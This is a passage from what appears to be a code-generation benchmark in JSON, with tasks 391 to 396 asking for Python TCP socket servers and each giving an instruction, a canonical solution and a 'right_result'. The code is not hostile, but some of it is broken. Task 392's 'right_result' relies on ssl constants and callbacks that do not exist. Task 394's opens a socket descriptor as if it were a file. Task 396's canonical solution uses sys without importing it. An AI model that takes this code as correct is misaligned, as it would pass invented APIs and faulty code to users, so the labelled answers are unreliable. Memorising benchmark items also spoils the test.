    "Task_id": 391,
    "Instruction": "Task Description: Create a Python class that implements a basic HTTP server using TCP sockets to handle client connections, process HTTP requests, and send responses.\n\nClass Description: HTTPOutput is a class that provides functionality to create a TCP server, accept client connections, handle HTTP requests, and send responses. It includes methods for server management and HTTP protocol handling.\n\nAttributes:\n- host: str | None - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to bind the server to (default: 0 for auto-selection)\n- conn: socket.socket | None - The active client connection socket\n- socket: socket.socket - The server socket\n- request: HTTPRequest | None - The parsed HTTP request object\n\nMethods:\n- addresses() -> list[str] - Property that returns available IP addresses for binding\n- urls() -> Generator[str, None, None] - Property that generates accessible URLs for the server\n- start_server() -> None - Creates and configures the server socket, binds it, and starts listening\n- accept_connection(timeout: int = 30) -> None - Accepts an incoming client connection with optional timeout\n- _open() -> None - Internal method to handle HTTP request parsing and initial response\n- _write(data: bytes) -> None - Sends data to the connected client\n- _close() -> None - Closes the current client connection\n- shutdown() -> None - Properly shuts down the server and cleans up resources",
    "Canonical_solution": "import socket\nfrom contextlib import suppress\nfrom http.server import BaseHTTPRequestHandler\nfrom io import BytesIO\n\nclass HTTPRequest(BaseHTTPRequestHandler):\n    def __init__(self, request_text):\n        self.rfile = BytesIO(request_text)\n        self.raw_requestline = self.rfile.readline()\n        self.error_code = self.error_message = None\n        self.parse_request()\n\n    def send_error(self, code, message=None, explain=None):\n        self.error_code = code\n        self.error_message = message\n\nclass HTTPOutput:\n    def __init__(self, host: str | None = \"127.0.0.1\", port: int = 0) -> None:\n        self.host = host\n        self.port = port\n        self.conn: socket.socket | None = None\n        self.socket: socket.socket = None\n        self.request = None\n\n    @property\n    def addresses(self):\n        if self.host:\n            return [self.host]\n\n        addrs = {\"127.0.0.1\"}\n        with suppress(socket.gaierror):\n            for info in socket.getaddrinfo(socket.gethostname(), self.port, socket.AF_INET):\n                addrs.add(info[4][0])\n\n        return sorted(addrs)\n\n    @property\n    def urls(self):\n        for addr in self.addresses:\n            yield f\"http://{addr}:{self.port}/\"\n\n    def start_server(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.socket.bind((self.host or \"\", self.port))\n        self.socket.listen(1)\n        self.host, self.port = self.socket.getsockname()\n        if self.host == \"0.0.0.0\":\n            self.host = None\n\n    def accept_connection(self, timeout=30) -> None:\n        self.socket.settimeout(timeout)\n        try:\n            conn, _addr = self.socket.accept()\n            conn.settimeout(None)\n            self.conn = conn\n        except socket.timeout as err:\n            self.conn = None\n            raise OSError(\"Socket accept timed out\") from err\n\n    def _open(self):\n        conn = self.conn\n        if not conn:\n            raise OSError(\"No client connection\")\n\n        try:\n            req_data = conn.recv(1024)\n        except OSError as err:\n            raise OSError(\"Failed to read data from socket\") from err\n\n        req = HTTPRequest(req_data)\n        if req.command not in (\"GET\", \"HEAD\"):\n            conn.send(b\"HTTP/1.1 501 Not Implemented\\r\\n\")\n            conn.close()\n            raise OSError(f\"Invalid request method: {req.command}\")\n\n        try:\n            conn.send(b\"HTTP/1.1 200 OK\\r\\n\")\n            conn.send(b\"Server: Streamlink\\r\\n\")\n            conn.send(b\"Content-Type: video/unknown\\r\\n\")\n            conn.send(b\"\\r\\n\")\n        except OSError as err:\n            raise OSError(\"Failed to write data to socket\") from err\n\n        if req.command == \"HEAD\":\n            conn.close()\n            raise OSError\n\n        self.request = req\n\n    def _write(self, data):\n        self.conn.sendall(data)\n\n    def _close(self):\n        if self.conn:\n            with suppress(OSError):\n                self.conn.close()\n            self.conn = None\n\n    def shutdown(self) -> None:\n        self._close()\n        with suppress(OSError):\n            self.socket.shutdown(socket.SHUT_RDWR)\n        with suppress(OSError):\n            self.socket.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\nfrom typing import Optional, List, Generator\nfrom urllib.parse import urlparse\n\nclass HTTPRequest:\n    def __init__(self, method: str, path: str, headers: dict, body: bytes):\n        self.method = method\n        self.path = path\n        self.headers = headers\n        self.body = body\n\nclass HTTPOutput:\n    def __init__(self, host: Optional[str] = \"127.0.0.1\", port: int = 0):\n        self.host = host\n        self.port = port\n        self.conn: Optional[socket.socket] = None\n        self.addr = None\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.request: Optional[HTTPRequest] = None\n\n    @property\n    def addresses(self) -> List[str]:\n        return [ip[4][0] for ip in socket.getaddrinfo(socket.gethostname(), None)]\n\n    @property\n    def urls(self) -> Generator[str, None, None]:\n        if isinstance(self.host, list):\n            hosts = self.host\n        elif self.host == \"0.0.0.0\":\n            hosts = [\"localhost\"] + self.addresses\n        else:\n            hosts = [self.host]\n\n        bound_port = self.port or self.socket.getsockname()[1]\n        for host in hosts:\n            yield f\"http://{host}:{bound_port}\"\n\n    def start_server(self) -> None:\n        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.socket.bind((self.host, self.port))\n        self.socket.listen(5)\n        \n    def accept_connection(self, timeout: int = 30) -> None:\n        self.socket.settimeout(timeout)\n        try:\n            self.conn, self.addr = self.socket.accept()\n            self.conn.settimeout(None)\n        except socket.timeout:\n            raise TimeoutError(\"Connection acceptance timed out\")\n\n    def _open(self) -> None:\n        if not self.conn:\n            return\n\n        request_data = b\"\"\n        while b\"\\r\\n\\r\\n\" not in request_data:\n            chunk = self.conn.recv(1024)\n            if not chunk:\n                break\n            request_data += chunk\n\n        if not request_data:\n            return\n\n        headers_end = request_data.find(b\"\\r\\n\\r\\n\")\n        header_part = request_data[:headers_end].decode('utf-8')\n        body_part = request_data[headers_end+4:]\n\n        lines = header_part.split('\\r\\n')\n        request_line = lines[0]\n        headers = {}\n\n        for line in lines[1:]:\n            if \": \" in line:\n                key, value = line.split(\": \", 1)\n                headers[key] = value\n\n        method, path, _ = request_line.split(' ')\n        \n        content_length = int(headers.get('Content-Length', '0'))\n        while len(body_part) < content_length:\n            body_part += self.conn.recv(1024)\n\n        self.request = HTTPRequest(method, path, headers, body_part)\n\n    def _write(self, data: bytes) -> None:\n        if self.conn:\n            self.conn.sendall(data)\n\n    def _close(self) -> None:\n        if self.conn:\n            self.conn.close()\n            self.conn = None\n            self.addr = None\n            self.request = None\n\n    def shutdown(self) -> None:\n        self._close()\n        self.socket.close()"
  },
  {
    "Task_id": 392,
    "Instruction": "Task Description: Implement a TCP server class in Python that handles client connections, data exchange, and supports various TLS/SSL configurations for secure communication.\n\nClass Description: TLSServerAutomaton is a TCP server implementation that provides secure communication capabilities with configurable TLS parameters. It handles socket creation, binding, client acceptance, data transmission, and cleanup operations.\n\nAttributes:\n\nserversocket: [socket.socket] - The main server socket object\nip_family: [int] - Address family (default: AF_INET)\nlocal_ip: [str] - Local IP address to bind to\nlocal_port: [int] - Local port to bind to\nremote_ip: [str] - Connected client's IP address\nremote_port: [int] - Connected client's port\nclient_auth: [bool] - Flag for client authentication requirement\nis_echo_server: [bool] - Flag to enable echo server behavior\nmax_client_idle_time: [int] - Maximum idle time before disconnecting (seconds)\ncurve: [str] - Preferred elliptic curve for ECDHE\npreferred_ciphersuite: [Optional[int]] - Preferred cipher suite\npreferred_signature_algorithm: [Union[str, int, None]] - Preferred signature algorithm\ncookie: [bool] - Enable DTLS cookie protection\npsk_secret: [Optional[str]] - Pre-shared key secret\npsk_mode: [Optional[str]] - Pre-shared key mode\n\nMethods:\n\nbind_socket() -> [bool] - Creates and binds the server socket, returns success status\naccept_client() -> [None] - Accepts an incoming client connection\nclose_client_socket() -> [None] - Closes the current client connection\nclose_server_socket() -> [None] - Closes the server socket\nreceive_data(timeout: Optional[int] = None) -> [Optional[bytes]] - Receives data from client with optional timeout\nsend_data(data: bytes) -> [bool] - Sends data to client, returns success status\nrun_server() -> [None] - Main server loop that handles client connections and data exchange",
    "Canonical_solution": "import socket\nfrom typing import Optional, Union\n\nclass TLSServerAutomaton:\n    def __init__(self, server=\"127.0.0.1\", sport=4433,\n                 mycert=None, mykey=None,\n                 preferred_ciphersuite: Optional[int] = None,\n                 preferred_signature_algorithm: Union[str, int, None] = None,\n                 client_auth=False,\n                 is_echo_server=True,\n                 max_client_idle_time=60,\n                 handle_session_ticket=None,\n                 session_ticket_file=None,\n                 curve=None,\n                 cookie=False,\n                 psk=None,\n                 psk_mode=None):\n\n        self.serversocket = None\n        self.ip_family = socket.AF_INET\n        self.local_ip = server\n        self.local_port = sport\n        self.remote_ip = None\n        self.remote_port = None\n\n        self.client_auth = client_auth\n        self.is_echo_server = is_echo_server\n        self.max_client_idle_time = max_client_idle_time\n        self.curve = curve\n        self.preferred_ciphersuite = preferred_ciphersuite\n        self.preferred_signature_algorithm = preferred_signature_algorithm\n        self.cookie = cookie\n        self.psk_secret = psk\n        self.psk_mode = psk_mode\n\n    def bind_socket(self):\n        s = socket.socket(self.ip_family, socket.SOCK_STREAM)\n        self.serversocket = s\n        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        try:\n            s.bind((self.local_ip, self.local_port))\n            s.listen(1)\n            return True\n        except Exception as e:\n            print(f\"Unable to bind on {self.local_ip}:{self.local_port}! ({e})\")\n            return False\n\n    def accept_client(self):\n        self.socket, addr = self.serversocket.accept()\n        if not isinstance(addr, tuple):\n            addr = self.socket.getpeername()\n        if len(addr) > 2:\n            addr = (addr[0], addr[1])\n        self.remote_ip, self.remote_port = addr\n        print(f\"Accepted connection from {self.remote_ip}:{self.remote_port}\")\n\n    def close_client_socket(self):\n        self.socket.close()\n\n    def close_server_socket(self):\n        if self.serversocket:\n            self.serversocket.close()\n\n    def receive_data(self, timeout=None):\n        if timeout:\n            self.socket.settimeout(timeout)\n        try:\n            data = self.socket.recv(4096)\n            return data if data else None\n        except socket.timeout:\n            return None\n        except Exception:\n            return None\n\n    def send_data(self, data):\n        try:\n            self.socket.sendall(data)\n            return True\n        except Exception:\n            return False\n\n    def run_server(self):\n        if not self.bind_socket():\n            return\n\n        try:\n            while True:\n                self.accept_client()\n                try:\n                    while True:\n                        data = self.receive_data(self.max_client_idle_time)\n                        if not data:\n                            break\n                        if self.is_echo_server:\n                            self.send_data(data)\n                finally:\n                    self.close_client_socket()\n        finally:\n            self.close_server_socket()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport ssl\nimport threading\nimport time\nfrom typing import Optional, Union\n\nclass TLSServerAutomaton:\n    def __init__(self, local_ip: str, local_port: int, ip_family=socket.AF_INET, client_auth=False,\n                 is_echo_server=True, max_client_idle_time=60, curve=None, preferred_ciphersuite=None,\n                 preferred_signature_algorithm=None, cookie=False, psk_secret=None, psk_mode=None):\n        self.serversocket = None\n        self.ip_family = ip_family\n        self.local_ip = local_ip\n        self.local_port = local_port\n        self.remote_ip = None\n        self.remote_port = None\n        self.client_auth = client_auth\n        self.is_echo_server = is_echo_server\n        self.max_client_idle_time = max_client_idle_time\n        self.curve = curve\n        self.preferred_ciphersuite = preferred_ciphersuite\n        self.preferred_signature_algorithm = preferred_signature_algorithm\n        self.cookie = cookie\n        self.psk_secret = psk_secret\n        self.psk_mode = psk_mode\n        self.clientsocket = None\n        self.running = False\n\n    def bind_socket(self) -> bool:\n        try:\n            self.serversocket = socket.socket(self.ip_family, socket.SOCK_STREAM)\n            self.serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            \n            if self.ip_family == socket.AF_INET6:\n                self.serversocket.bind((self.local_ip, self.local_port, 0, 0))\n            else:\n                self.serversocket.bind((self.local_ip, self.local_port))\n                \n            self.serversocket.listen(5)\n            return True\n        except Exception as e:\n            print(f\"Socket binding failed: {e}\")\n            return False\n\n    def accept_client(self) -> None:\n        try:\n            clientsocket, (self.remote_ip, self.remote_port) = self.serversocket.accept()\n            \n            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n            context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1\n            \n            if self.curve:\n                context.set_ecdh_curve(self.curve)\n                \n            if self.preferred_ciphersuite is not None:\n                context.set_ciphers(f\":{self.preferred_ciphersuite}:\")\n                \n            if self.preferred_signature_algorithm is not None:\n                if isinstance(self.preferred_signature_algorithm, str):\n                    context.signature_algorithms = [self.preferred_signature_algorithm]\n                elif isinstance(self.preferred_signature_algorithm, int):\n                    context.signature_algorithms = [f\"rsa_pss_rsae_sha{self.preferred_signature_algorithm}\"]\n                    \n            if self.cookie:\n                context.options |= ssl.OP_COOKIE_EXCHANGE\n                \n            if self.psk_secret and self.psk_mode:\n                def psk_callback(conn, identity_hint):\n                    return self.psk_secret\n                    \n                context.psk_server_callback = psk_callback\n                if self.psk_mode == \"psk\":\n                    context.options |= ssl.OP_PSK_SERVER_PARENTHESES\n                elif self.psk_mode == \"psk_dhe\":\n                    context.options |= ssl.OP_PSK_DHE\n                \n            if self.client_auth:\n                context.verify_mode = ssl.CERT_REQUIRED\n                \n            self.clientsocket = context.wrap_socket(clientsocket, server_side=True)\n            self.last_activity_time = time.time()\n            \n        except Exception as e:\n            print(f\"Client acceptance failed: {e}\")\n            if clientsocket:\n                clientsocket.close()\n\n    def close_client_socket(self) -> None:\n        if self.clientsocket:\n            self.clientsocket.close()\n            self.clientsocket = None\n\n    def close_server_socket(self) -> None:\n        if self.serversocket:\n            self.serversocket.close()\n            self.serversocket = None\n\n    def receive_data(self, timeout: Optional[int] = None) -> Optional[bytes]:\n        if not self.clientsocket:\n            return None\n            \n        if timeout:\n            self.clientsocket.settimeout(timeout)\n            \n        try:\n            data = self.clientsocket.recv(65535)\n            if data:\n                self.last_activity_time = time.time()\n                return data\n            return None\n        except socket.timeout:\n            if timeout and (time.time() - self.last_activity_time) > self.max_client_idle_time:\n                self.close_client_socket()\n            return None\n        except Exception as e:\n            print(f\"Receive error: {e}\")\n            self.close_client_socket()\n            return None\n\n    def send_data(self, data: bytes) -> bool:\n        if not self.clientsocket:\n            return False\n            \n        try:\n            self.clientsocket.sendall(data)\n            return True\n        except Exception as e:\n            print(f\"Send error: {e}\")\n            self.close_client_socket()\n            return False\n\n    def handle_client_connection(self):\n        while self.running and self.clientsocket:\n            data = self.receive_data(timeout=1)\n            if not data:\n                break\n            if self.is_echo_server:\n                self.send_data(data)\n                \n        self.close_client_socket()\n\n    def run_server(self) -> None:\n        if not self.bind_socket():\n            return\n            \n        self.running = True\n        print(f\"Server started on {self.local_ip}:{self.local_port}\")\n        \n        try:\n            while self.running:\n                self.accept_client()\n                if self.clientsocket:\n                    client_thread = threading.Thread(target=self.handle_client_connection)\n                    client_thread.start()\n        except KeyboardInterrupt:\n            print(\"\\nShutting down server...\")\n        finally:\n            self.running = False\n            self.close_server_socket()"
  },
  {
    "Task_id": 394,
    "Instruction": "Task Description: Implement a TCP server that accepts client connections and delegates the handling of these connections to a worker process using inter-process communication (IPC).\n\nFunction Description: The function `server` establishes a TCP server that listens for incoming client connections. When a client connects, the server sends the client's file descriptor to a pre-connected worker process using `send_handle`, allowing the worker to take over the client communication. The server then closes its end of the connection, leaving the worker to handle further interaction with the client.\n\nInput:\n- `work_address`: [str] - The address (e.g., a named pipe or network address) where the worker process is listening for connections.\n- `port`: [int] - The TCP port number on which the server should listen for incoming client connections.\n\nOutput: None (The function runs indefinitely in a loop, accepting and delegating client connections.)",
    "Canonical_solution": "from multiprocessing.connection import Listener\nfrom multiprocessing.reduction import send_handle\nimport socket\n\ndef server(work_address, port):\n    # Wait for the worker to connect\n    work_serv = Listener(work_address, authkey=b'peekaboo')\n    worker = work_serv.accept()\n    worker_pid = worker.recv()\n\n    # Now run a TCP/IP server and send clients to worker\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)\n    s.bind(('', port))\n    s.listen(1)\n    while True:\n        client, addr = s.accept()\n        print('SERVER: Got connection from', addr)\n        send_handle(worker, client.fileno(), worker_pid)\n        client.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport multiprocessing\n\ndef server(work_address, port):\n    def send_handle(sock, handle, worker_addr):\n        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as unix_sock:\n            unix_sock.connect(worker_addr)\n            msg = f\"FD:{handle}\"\n            unix_sock.sendall(msg.encode())\n            with open(handle, 'w') as f:\n                pass\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind(('0.0.0.0', port))\n    sock.listen(100)\n\n    while True:\n        client_fd, addr = sock.accept()\n        send_handle(sock, client_fd.fileno(), work_address)\n        client_fd.close()"
  },
  {
    "Task_id": 396,
    "Instruction": "Task Description: Implement a TCP server in Python that handles multiple client connections asynchronously using sockets and selectors for efficient I/O multiplexing.\n\nClass Description: NetworkThread is a threading-based TCP server implementation that manages peer-to-peer connections, handles incoming and outgoing data, and processes network events asynchronously.\n\nAttributes:\n- pending_shutdown: [bool] - Flag indicating if the server is shutting down\n- upload_speed: [int] - Current upload speed limit\n- token: [str] - Authentication token for server connections\n- _pending_network_msgs: [deque] - Queue for pending network messages\n- _user_update_counter: [int] - Counter for user updates\n- _user_update_counters: [dict] - Dictionary of user-specific update counters\n- _upload_queue_timer_id: [int] - Timer ID for upload queue processing\n- _retry_failed_uploads_timer_id: [int] - Timer ID for retrying failed uploads\n- _message_queue: [deque] - Queue for internal messages\n- _pending_peer_conns: [dict] - Dictionary of pending peer connections\n- _pending_init_msgs: [defaultdict] - Dictionary of pending initialization messages\n- _token_init_msgs: [dict] - Dictionary of token-based initialization messages\n- _username_init_msgs: [dict] - Dictionary of username-based initialization messages\n- _user_addresses: [dict] - Dictionary mapping usernames to addresses\n- _should_process_queue: [bool] - Flag for message queue processing\n- _want_abort: [bool] - Flag for thread termination\n- _selector: [selectors.DefaultSelector] - I/O multiplexing selector\n- _listen_socket: [socket.socket] - Main listening socket\n- _listen_port: [int] - Listening port number\n- _interface_name: [str] - Network interface name\n- _interface_address: [str] - Network interface IP address\n- _portmapper: [object] - Port mapping service reference\n- _local_ip_address: [str] - Local IP address\n- _server_conn: [Connection] - Server connection object\n- _server_address: [tuple] - Server address (IP, port)\n- _server_username: [str] - Server username\n- _server_timeout_time: [float] - Server timeout timestamp\n- _server_timeout_value: [int] - Server timeout duration\n- _manual_server_disconnect: [bool] - Manual disconnect flag\n- _manual_server_reconnect: [bool] - Manual reconnect flag\n- _server_relogged: [bool] - Server reconnection flag\n- _num_sockets: [int] - Current number of active sockets\n- _last_cycle_time: [float] - Last processing cycle timestamp\n- _conns: [dict] - Dictionary of active connections\n\nMethods:\n- _create_listen_socket() -> [bool] - Creates and configures the listening socket\n- _bind_listen_port() -> [bool] - Binds the socket to the specified port and interface\n- _accept_incoming_peer_connections() -> [None] - Accepts new client connections\n- _init_peer_connection(addr: tuple, init: object, response_token: str=None) -> [None] - Initializes outgoing peer connection\n- _process_ready_sockets(current_time: float) -> [None] - Processes ready sockets using selector\n- _process_ready_input_socket(sock: socket.socket, current_time: float) -> [None] - Handles socket read events\n- _process_ready_output_socket(sock: socket.socket, current_time: float) -> [None] - Handles socket write events\n- _read_data(conn: Connection, current_time: float) -> [bool] - Reads data from connection\n- _write_data(conn: Connection, current_time: float) -> [bool] - Writes data to connection\n- _modify_connection_events(conn: Connection, io_events: int) -> [None] - Modifies socket event monitoring\n- _close_connection(conn: Connection) -> [None] - Closes and cleans up a connection\n- _close_socket(sock: socket.socket) -> [None] - Safely closes a socket\n- run() -> [None] - Main thread execution loop",
    "Canonical_solution": "import errno\nimport selectors\nimport socket\nimport time\nfrom collections import defaultdict\nfrom collections import deque\nfrom os import strerror\nfrom threading import Thread\n\nclass NetworkThread(Thread):\n    \"\"\"This is the networking thread that does all the communication with the\n    Soulseek server and peers. Communication with the core is done through\n    events.\"\"\"\n\n    __slots__ = (\"pending_shutdown\", \"upload_speed\", \"token\", \"_pending_network_msgs\",\n                 \"_user_update_counter\", \"_user_update_counters\", \"_upload_queue_timer_id\",\n                 \"_retry_failed_uploads_timer_id\")\n\n    CONNECTION_BACKLOG_LENGTH = 65535\n    ERROR_NOT_CONNECTED = OSError(errno.ENOTCONN, strerror(errno.ENOTCONN))\n    ERROR_TIMED_OUT = OSError(errno.ETIMEDOUT, strerror(errno.ETIMEDOUT))\n\n    def __init__(self):\n        super().__init__(name=\"NetworkThread\")\n        self._message_queue = deque()\n        self._pending_peer_conns = {}\n        self._pending_init_msgs = defaultdict(list)\n        self._token_init_msgs = {}\n        self._username_init_msgs = {}\n        self._user_addresses = {}\n        self._should_process_queue = False\n        self._want_abort = False\n        self._selector = None\n        self._listen_socket = None\n        self._listen_port = None\n        self._interface_name = None\n        self._interface_address = None\n        self._portmapper = None\n        self._local_ip_address = \"\"\n        self._server_conn = None\n        self._server_address = None\n        self._server_username = None\n        self._server_timeout_time = None\n        self._server_timeout_value = -1\n        self._manual_server_disconnect = False\n        self._manual_server_reconnect = False\n        self._server_relogged = False\n        self._num_sockets = 0\n        self._last_cycle_time = 0\n        self._conns = {}\n\n    def _create_listen_socket(self):\n        self._listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._listen_socket.setblocking(False)\n        self._num_sockets += 1\n\n        if sys.platform != \"win32\":\n            self._listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n        if not self._bind_listen_port():\n            self._close_listen_socket()\n            return False\n\n        self._selector.register(self._listen_socket, selectors.EVENT_READ)\n        return True\n\n    def _bind_listen_port(self):\n        if not self._bind_socket_interface(self._listen_socket):\n            return False\n\n        try:\n            ip_address = self._interface_address or self._find_local_ip_address()\n            self._listen_socket.bind((ip_address, self._listen_port))\n            self._listen_socket.listen(self.CONNECTION_BACKLOG_LENGTH)\n        except OSError as error:\n            self._listen_port = None\n            return False\n\n        self._local_ip_address = ip_address\n        return True\n\n    def _accept_incoming_peer_connections(self):\n        while True:\n            try:\n                incoming_sock, incoming_addr = self._listen_socket.accept()\n                incoming_sock.setblocking(False)\n                incoming_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n            except OSError as error:\n                if error.errno == errno.EWOULDBLOCK:\n                    break\n                continue\n\n            io_events = selectors.EVENT_READ\n            conn = self._conns[incoming_sock] = PeerConnection(\n                sock=incoming_sock, addr=incoming_addr, io_events=io_events\n            )\n            self._num_sockets += 1\n            self._selector.register(incoming_sock, io_events)\n            conn.is_established = True\n\n    def _init_peer_connection(self, addr, init, response_token=None):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        io_events = selectors.EVENT_READ | selectors.EVENT_WRITE\n        conn = PeerConnection(\n            sock=sock, addr=addr, io_events=io_events,\n            init=init, request_token=None, response_token=response_token\n        )\n\n        sock.setblocking(False)\n        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n\n        try:\n            self._bind_socket_interface(sock)\n            sock.connect_ex(addr)\n        except OSError as error:\n            self._close_socket(sock)\n            return\n\n        init.sock = sock\n        self._conns[sock] = conn\n        self._selector.register(sock, io_events)\n        self._num_sockets += 1\n\n    def _process_ready_sockets(self, current_time):\n        if self._listen_socket is None:\n            return\n\n        for key, io_events in self._selector.select(timeout=0.05):\n            sock = key.fileobj\n\n            if io_events & selectors.EVENT_READ:\n                if sock is self._listen_socket:\n                    self._accept_incoming_peer_connections()\n                    continue\n                self._process_ready_input_socket(sock, current_time)\n\n            if io_events & selectors.EVENT_WRITE:\n                self._process_ready_output_socket(sock, current_time)\n\n    def _process_ready_input_socket(self, sock, current_time):\n        conn = self._conns.get(sock)\n        if not conn:\n            return\n\n        try:\n            if self._read_data(conn, current_time):\n                self._process_conn_incoming_messages(conn)\n                return\n        except OSError as error:\n            pass\n\n        self._close_connection(conn)\n\n    def _process_ready_output_socket(self, sock, current_time):\n        conn = self._conns.get(sock)\n        if not conn:\n            return\n\n        if not conn.is_established:\n            if conn is self._server_conn:\n                self._establish_outgoing_server_connection(conn)\n            else:\n                self._establish_outgoing_peer_connection(conn)\n            return\n\n        try:\n            if not self._write_data(conn, current_time):\n                self._close_connection(conn)\n        except (OSError, ValueError):\n            self._close_connection(conn)\n\n    def _read_data(self, conn, current_time):\n        data = conn.sock.recv(conn.recv_size)\n        if not data:\n            return False\n\n        conn.in_buffer += data\n        conn.last_active = current_time\n        return True\n\n    def _write_data(self, conn, current_time):\n        num_bytes_sent = conn.sock.send(conn.out_buffer)\n        del conn.out_buffer[:num_bytes_sent]\n\n        if not conn.out_buffer:\n            self._modify_connection_events(conn, selectors.EVENT_READ)\n\n        conn.last_active = current_time\n        return True\n\n    def _modify_connection_events(self, conn, io_events):\n        if conn.io_events != io_events:\n            self._selector.modify(conn.sock, io_events)\n            conn.io_events = io_events\n\n    def _close_connection(self, conn):\n        if not conn:\n            return\n\n        sock = conn.sock\n        del self._conns[sock]\n\n        self._selector.unregister(sock)\n        self._close_socket(sock)\n        self._num_sockets -= 1\n\n    @staticmethod\n    def _close_socket(sock):\n        try:\n            sock.shutdown(socket.SHUT_RDWR)\n        except OSError:\n            pass\n        sock.close()\n\n    def run(self):\n        self._selector = selectors.DefaultSelector()\n        try:\n            while not self._want_abort:\n                current_time = time.monotonic()\n                self._process_queue_messages()\n                self._process_ready_sockets(current_time)\n                time.sleep(0.004)\n        finally:\n            self._selector.close()\n\nclass Connection:\n    __slots__ = (\"sock\", \"addr\", \"io_events\", \"is_established\", \"in_buffer\", \"out_buffer\",\n                 \"last_active\", \"recv_size\")\n\n    def __init__(self, sock=None, addr=None, io_events=None):\n        self.sock = sock\n        self.addr = addr\n        self.io_events = io_events\n        self.in_buffer = bytearray()\n        self.out_buffer = bytearray()\n        self.last_active = time.monotonic()\n        self.recv_size = 51200\n        self.is_established = False\n\nclass PeerConnection(Connection):\n    __slots__ = (\"init\", \"request_token\", \"response_token\", \"has_post_init_activity\")\n\n    def __init__(self, *args, init=None, request_token=None, response_token=None, **kwargs):\n        Connection.__init__(self, *args, **kwargs)\n        self.init = init\n        self.request_token = request_token\n        self.response_token = response_token\n        self.has_post_init_activity = False",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport selectors\nimport threading\nfrom collections import deque, defaultdict\n\nclass Connection:\n    def __init__(self, sock, addr):\n        self.sock = sock\n        self.addr = addr\n        self.buffer = b''\n        self.out_queue = deque()\n        self.last_activity = 0.0\n\nclass NetworkThread(threading.Thread):\n    def __init__(self, interface_name='0.0.0.0', listen_port=8080):\n        super().__init__()\n        self.pending_shutdown = False\n        self.upload_speed = 0\n        self.token = ''\n        self._pending_network_msgs = deque()\n        self._user_update_counter = 0\n        self._user_update_counters = {}\n        self._upload_queue_timer_id = 0\n        self._retry_failed_uploads_timer_id = 0\n        self._message_queue = deque()\n        self._pending_peer_conns = {}\n        self._pending_init_msgs = defaultdict(list)\n        self._token_init_msgs = {}\n        self._username_init_msgs = {}\n        self._user_addresses = {}\n        self._should_process_queue = True\n        self._want_abort = False\n        self._selector = selectors.DefaultSelector()\n        self._listen_socket = None\n        self._listen_port = listen_port\n        self._interface_name = interface_name\n        self._interface_address = '0.0.0.0'\n        self._portmapper = None\n        self._local_ip_address = ''\n        self._server_conn = None\n        self._server_address = ('', 0)\n        self._server_username = ''\n        self._server_timeout_time = 0.0\n        self._server_timeout_value = 30\n        self._manual_server_disconnect = False\n        self._manual_server_reconnect = False\n        self._server_relogged = False\n        self._num_sockets = 0\n        self._last_cycle_time = 0.0\n        self._conns = {}\n\n    def _create_listen_socket(self):\n        try:\n            self._listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self._listen_socket.setblocking(False)\n            return True\n        except socket.error:\n            return False\n\n    def _bind_listen_port(self):\n        if not self._listen_socket:\n            return False\n        try:\n            self._listen_socket.bind((self._interface_name, self._listen_port))\n            self._listen_socket.listen(100)\n            self._selector.register(self._listen_socket, selectors.EVENT_READ, data=None)\n            return True\n        except socket.error:\n            return False\n\n    def _accept_incoming_peer_connections(self):\n        while True:\n            try:\n                conn, addr = self._listen_socket.accept()\n                conn.setblocking(False)\n                connection = Connection(conn, addr)\n                self._conns[conn.fileno()] = connection\n                self._selector.register(conn, selectors.EVENT_READ, data=connection)\n                self._num_sockets += 1\n            except socket.error:\n                break\n\n    def _init_peer_connection(self, addr, init, response_token=None):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.setblocking(False)\n            sock.connect_ex(addr)\n            connection = Connection(sock, addr)\n            self._conns[sock.fileno()] = connection\n            self._selector.register(sock, selectors.EVENT_READ | selectors.EVENT_WRITE, data=connection)\n            self._num_sockets += 1\n        except socket.error:\n            pass\n\n    def _process_ready_sockets(self, current_time):\n        events = self._selector.select(timeout=0.1)\n        for key, mask in events:\n            if key.fileobj == self._listen_socket:\n                self._accept_incoming_peer_connections()\n            elif isinstance(key.data, Connection):\n                if mask & selectors.EVENT_READ:\n                    self._process_ready_input_socket(key.fileobj, current_time)\n                if mask & selectors.EVENT_WRITE:\n                    self._process_ready_output_socket(key.fileobj, current_time)\n\n    def _process_ready_input_socket(self, sock, current_time):\n        conn = self._conns.get(sock.fileno())\n        if not conn:\n            return\n        if not self._read_data(conn, current_time):\n            self._close_connection(conn)\n\n    def _process_ready_output_socket(self, sock, current_time):\n        conn = self._conns.get(sock.fileno())\n        if not conn:\n            return\n        if not self._write_data(conn, current_time):\n            self._close_connection(conn)\n\n    def _read_data(self, conn, current_time):\n        try:\n            data = conn.sock.recv(4096)\n            if not data:\n                return False\n            conn.buffer += data\n            